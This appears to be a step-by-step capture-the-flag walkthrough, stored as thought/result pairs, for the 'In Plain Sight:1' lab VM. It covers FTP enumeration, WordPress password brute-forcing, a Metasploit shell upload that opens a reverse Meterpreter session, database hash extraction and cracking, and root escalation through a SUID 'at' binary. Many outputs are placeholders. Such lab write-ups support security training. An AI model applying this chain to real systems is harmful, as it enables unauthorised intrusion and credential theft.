initial_prompt: Objective: As a cybersecurity expert using Kali 2024 (Attack Machine), identify vulnerabilities, escalate privileges, and retrieve the root flag on the 'In Plain Sight:1' virtual machine (Target Machine). The target IP is assumed to be 192.168.43.8 after initial network discovery. The process involves network scanning, FTP enumeration, WordPress exploitation (including finding credentials and uploading a shell), MySQL database credential extraction, password cracking, and SUID binary exploitation for root access.

steps.thought: Identify the target machine's IP address on the local network. We will assume the attacker's network is 192.168.43.0/24 for this example. The command will scan this range.
steps.result: Netdiscover scans the specified network range. Output will list discovered hosts. For this scenario, we identify the target VM as 192.168.43.8. (Example output line: '192.168.43.8  08:00:27:XX:XX:XX  3  60  Unknown vendor')

steps.thought: Perform a quick scan of all TCP ports on the target IP to identify open ports.
steps.result:
Nmap scans all 65535 TCP ports. Output indicates open ports. For this scenario: 
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

steps.thought: Perform a detailed scan on the discovered open ports (21, 22, 80) to identify service versions and run default scripts.
steps.result: Nmap provides detailed information. Example: FTP (vsftpd), SSH (OpenSSH), HTTP (Apache httpd). Scripts might reveal anonymous FTP login is allowed. (e.g., '21/tcp open  ftp         vsftpd 3.0.3', '80/tcp open  http        Apache httpd 2.4.x ((Ubuntu))')

steps.thought: Attempt to connect to the FTP server.
steps.result:
Connected to 192.168.43.8.
220 (vsFTPd 3.0.3) server ready.
Name (192.168.43.8:kali):

steps.thought: Log in using anonymous credentials. Enter 'anonymous' for the username.
steps.result:
331 Please specify the password.
Password:

steps.thought: Provide a blank password for anonymous FTP login by pressing Enter.
steps.result:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>

steps.thought: List files in the current directory on the FTP server.
steps.result:
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 May 15  2023 .
drwxr-xr-x    2 ftp      ftp          4096 May 15  2023 ..
-rw-r--r--    1 ftp      ftp            29 May 15  2023 todo.txt
226 Directory send OK.
ftp>

steps.thought: Download the 'todo.txt' file from the FTP server.
steps.result:
local: todo.txt remote: todo.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for todo.txt (29 bytes).
226 Transfer complete.
29 bytes received in 0.00 secs (X.XX kB/s)
ftp>

steps.thought: Exit the FTP session.
steps.result: 221 Goodbye.

steps.thought: Display the content of the downloaded 'todo.txt' file.
steps.result: c28tZGV2LXdvcmRwcmVzcw==

steps.thought: Decode the base64 string found in 'todo.txt'.
steps.result: so-dev-wordpress

steps.thought: Check the root of the web server.
steps.result: HTML content of the Apache2 Ubuntu Default Page is displayed.

steps.thought: Check the hinted directory '/so-dev-wordpress' on the web server.
steps.result: HTML content is displayed, indicating a WordPress site (e.g., references to wp-content, wp-login.php).

steps.thought: Enumerate users on the WordPress site found at '/so-dev-wordpress'.
steps.result: WPScan output listing identified users. For this scenario, users like 'admin' and 'mike' are found. (Note: Replace YOUR_WPSCAN_API_TOKEN with a valid token for full functionality).

steps.thought: Attempt to brute-force passwords for users 'admin' and 'mike' using a common wordlist. (Note: /usr/share/wordlists/dirb/common.txt is typically for directory names, not passwords, but used as per original context).
steps.result: WPScan attempts to brute-force passwords. Output indicates success for 'admin' with password 'admin'. (e.g., '[+] admin:admin')

steps.thought: Start Metasploit Framework console quietly.
steps.result: msf6 >

steps.thought: Use the WordPress admin shell upload exploit module.
steps.result: msf6 exploit(unix/webapp/wp_admin_shell_upload) >

steps.thought: Set the target host IP address.
steps.result:
RHOSTS => 192.168.43.8
msf6 exploit(unix/webapp/wp_admin_shell_upload) >

steps.thought: Set the target URI for the WordPress installation.
steps.result:
TARGETURI => /so-dev-wordpress
msf6 exploit(unix/webapp/wp_admin_shell_upload) >

steps.thought: Set the WordPress admin username.
steps.result:
USERNAME => admin
msf6 exploit(unix/webapp/wp_admin_shell_upload) >

steps.thought: Set the WordPress admin password.
steps.result:
PASSWORD => admin
msf6 exploit(unix/webapp/wp_admin_shell_upload) >

steps.thought: Run the exploit to upload a shell and get a session.
steps.result:
[*] Started reverse TCP handler on ...
[*] Uploading payload...
[*] Executing payload...
[*] Meterpreter session 1 opened (ATTACKER_IP:PORT -> TARGET_IP:PORT) at YYYY-MM-DD HH:MM:SS -0000

meterpreter >

steps.thought: Upgrade the Meterpreter shell to a more interactive shell.
steps.result:
Process X created.
Channel Y created.

steps.thought: Spawn a proper TTY shell using Python.
steps.result: www-data@target:/var/www/html/so-dev-wordpress$ (or similar prompt)

steps.thought: Navigate to the WordPress root directory (if not already there).
steps.result: www-data@target:/var/www/html/so-dev-wordpress$ (prompt shows current directory)

steps.thought: Read the WordPress configuration file to find database credentials.
Attempt to log in to MySQL using the discovered credentials (sodevwp:wordpress321).
steps.result: Enter password:

steps.thought: Enter the password 'wordpress321' at the prompt.
steps.result:
Welcome to the MySQL monitor. Commands end with ; or \g.
Your MySQL connection id is X

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql>

steps.thought: List all databases available to the current MySQL user.
steps.result:
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sodevwp            |
+--------------------+

mysql>

steps.thought: Select the 'sodevwp' database.
steps.result:
Database changed
mysql>

steps.thought: List all tables within the 'sodevwp' database.
steps.result:
Output lists tables, including 'sodevwp_users'.
+-----------------------+
| Tables_in_sodevwp     |
+-----------------------+
| sodevwp_commentmeta   |
| sodevwp_comments      |
| ...                   |
| sodevwp_users         |
| ...                   |
+-----------------------+
(typically 12-15 tables for a standard WordPress install)
mysql>

steps.thought: Retrieve all data from the 'sodevwp_users' table to get user hashes.
steps.result:
Output displays user logins and their password hashes.
+------------+------------------------------------+
| user_login | user_pass                          |
+------------+------------------------------------+
| admin      | $P$BF6wg0/69X1wsUmyvWpbLwibOvf2hO/ |
| mike       | $P$BPgEwoKwJqTsSchlCEoRRr133Mg64v0 |
+------------+------------------------------------+
2 rows in set (0.00 sec)
mysql>

steps.thought: Exit the MySQL session.
steps.result:
Bye
www-data@target:/var/www/html/so-dev-wordpress$

steps.thought: Save Mike's password hash to a file named 'mike_hash.txt' for cracking.
steps.result: The hash for user 'mike' is saved to /tmp/mike_hash.txt. No direct output to console.

steps.thought: Ensure the rockyou.txt wordlist is available. If /usr/share/wordlists/rockyou.txt.gz exists, gunzip it. This command might require sudo if the user doesn't have write permission in /usr/share/wordlists.
steps.result: Ensures /usr/share/wordlists/rockyou.txt is available. If it was gzipped, it's now extracted. If already extracted, no change. (Sudo password may be prompted if not cached).

steps.thought: Attempt to crack Mike's password hash using John the Ripper and the rockyou.txt wordlist.
steps.result:
John the Ripper attempts to crack the hash. Output may include:
Loaded 1 password hash (phpass, WordPress $P$)
Cost 1 (iteration count) is 8192 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
spider99         (mike)
1g 0:00:00:0X DONE (YYYY-MM-DD HH:MM) X.XXXXg/s XXXXp/s XXXXc/s XXXXCr/s ...
Session completed.

steps.thought: Display the cracked password for Mike.
steps.result:
mike:spider99:UID:GID:FullName:HomeDirectory:Shell

1 password hash cracked, 0 left

steps.thought: Attempt to switch user to 'mike' using the cracked password 'spider99' via SSH from the attacker machine. (Exit current shell on target if necessary first, or open new terminal on attacker machine).
steps.result:
The authenticity of host '192.168.43.8 (192.168.43.8)' can't be established.
ECDSA key fingerprint is SHA256:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.43.8' (ECDSA) to the list of known hosts.
mike@192.168.43.8's password:

steps.thought: Enter the password 'spider99' for user 'mike' at the SSH prompt.
steps.result:
Welcome to Ubuntu X.X.X LTS (GNU/Linux X.X.X-X-generic x86_64)

* Documentation:  https://help.ubuntu.com
* Management:     https://landscape.canonical.com
* Support:        https://ubuntu.com/advantage
Last login: [Date Time] from [IP Address]
mike@target:~$

steps.thought: Search for SUID binaries on the system as user 'mike'.
steps.result:
A list of SUID binaries is displayed. Among them, '/usr/bin/at' should be present.
Example output lines:
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/at
...

steps.thought: Use the SUID 'at' binary to schedule a command that creates a SUID copy of bash.
steps.result:
job X at YYYY-MM-DD HH:MM
mike@target:~$

steps.thought: Wait for approximately 65 seconds for the 'at' job to execute.
steps.result: The shell pauses for 65 seconds. No direct output.

steps.thought: Check if the SUID bash copy was created successfully in /tmp.
steps.result: -rwsr-xr-x 1 root root XXXXXX Month Day HH:MM /tmp/mikebash

steps.thought: Execute the SUID bash copy with the -p flag to gain root privileges.
steps.result: target:/tmp# (prompt changes to root prompt)

steps.thought: Confirm root access by checking the current user.
steps.result: root

steps.thought: Navigate to the root directory to find the flag.
steps.result: target:/root#

steps.thought: List files in the /root directory.
steps.result: flag.txt (or root.txt, or similar)

steps.thought: Read the content of the root flag file (assuming it's 'flag.txt').
steps.result: The content of the root flag is displayed (e.g., 'CTF{Th1s_1s_Th3_R00t_Fl4g}'). Challenge complete.
